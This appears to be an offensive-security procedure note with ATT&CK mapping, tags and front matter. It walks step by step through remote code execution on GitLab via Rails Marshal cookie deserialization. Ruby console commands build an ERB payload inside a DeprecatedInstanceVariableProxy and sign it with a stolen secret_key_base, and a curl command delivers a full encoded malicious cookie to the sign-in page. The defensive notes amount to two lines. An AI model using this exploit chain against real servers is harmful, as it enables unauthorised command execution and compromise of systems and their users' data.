---
tags:
  - rce
  - deserialization
type: procedure
tools:
  - '[[tools/Rails-Console]]'
  - '[[tools/curl]]'
  - '[[tools/cat]]'
tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
commands:
  - '[[commands/rails-request-setup]]'
  - '[[commands/rails-set-serializer]]'
  - '[[commands/rails-cookie-jar]]'
  - '[[commands/rails-erb-payload]]'
  - '[[commands/rails-deprecated-proxy]]'
  - '[[commands/rails-set-signed-cookie]]'
  - '[[commands/rails-print-cookie]]'
  - '[[commands/curl-send-malicious-cookie]]'
  - '[[commands/cat-verify-file]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Command-Line Interface]]'
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 289d7581-658c-489e-b238-82f56c4d5c5d
created_at: '2025-12-11T06:10:40.432Z'
updated_at: '2025-12-11T06:10:40.432Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
  - '[[TA0003]]'
mitre_techniques:
  - '[[T1059]]'
  - '[[T1190]]'
---
# Generate and Deliver Deserialization Payload for RCE

## Summary

This procedure generates a malicious serialized cookie using the stolen secret_key_base and delivers it to achieve remote code execution.

## Description

Using a local Rails console with the target's secret, create an ERB payload wrapped in a deprecated proxy for deserialization exploit, then send via curl to trigger command execution.

## Requirements

1. Stolen secret_key_base
2. Local GitLab instance for payload generation
3. Access to target GitLab sign-in endpoint

## Defense

Defensive measures and detection strategies:

- Use safe serializers (e.g., JSON instead of marshal)
- Monitor for anomalous cookie deserialization

## Objectives

1. Craft signed malicious payload
2. Execute arbitrary commands on server
3. Verify execution

## Instructions

### Step 1: Setup Request in Rails Console

**Context**: Simulate a request for cookie manipulation.

**Command** ([[commands/rails-request-setup]]):
```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
```

> Creates a request object with Rails config.

### Step 2: Set Serializer

**Context**: Force marshal serialization.

**Command** ([[commands/rails-set-serializer]]):
```ruby
request.env["action_dispatch.cookies_serializer"]=:marshal
```

> Sets the serializer to marshal.

### Step 3: Get Cookie Jar

**Context**: Access cookies.

**Command** ([[commands/rails-cookie-jar]]):
```ruby
cookies = request.cookie_jar
```

> Retrieves the cookie jar.

### Step 4: Create ERB Payload

**Context**: Build command-executing ERB.

**Command** ([[commands/rails-erb-payload]]):
```ruby
erb =ERB.new("<%= `echo vakzz was here > /tmp/vakzz` %>")
```

> Creates ERB with shell command.

### Step 5: Create Deprecated Proxy

**Context**: Wrap for exploit.

**Command** ([[commands/rails-deprecated-proxy]]):
```ruby
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result", ActiveSupport::Deprecation.new)
```

> Builds the proxy object.

### Step 6: Set Signed Cookie

**Context**: Sign the payload.

**Command** ([[commands/rails-set-signed-cookie]]):
```ruby
cookies.signed[:cookie]= depr
```

> Signs and sets the cookie.

### Step 7: Print Payload

**Context**: Output for use.

**Command** ([[commands/rails-print-cookie]]):
```ruby
puts cookies[:cookie]
```

> Prints the serialized value.

### Step 8: Send Payload

**Context**: Deliver via HTTP.

**Command** ([[commands/curl-send-malicious-cookie]]):
```bash
curl -vvv 'http://gitlab-vm.local/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06"
```

> Sends the malicious cookie.

### Step 9: Verify Execution

**Context**: Check command output.

**Command** ([[commands/cat-verify-file]]):
```bash
cat /tmp/vakzz
```

> Reads the created file.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Persistence]]

### Techniques

- [[Command-Line Interface]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/rails-request-setup]]
- [[commands/rails-set-serializer]]
- [[commands/rails-cookie-jar]]
- [[commands/rails-erb-payload]]
- [[commands/rails-deprecated-proxy]]
- [[commands/rails-set-signed-cookie]]
- [[commands/rails-print-cookie]]
- [[commands/curl-send-malicious-cookie]]
- [[commands/cat-verify-file]]

## Tools Used

- [[tools/Rails-Console]]
- [[tools/curl]]
- [[tools/cat]]

## Tags

- rce
- deserialization
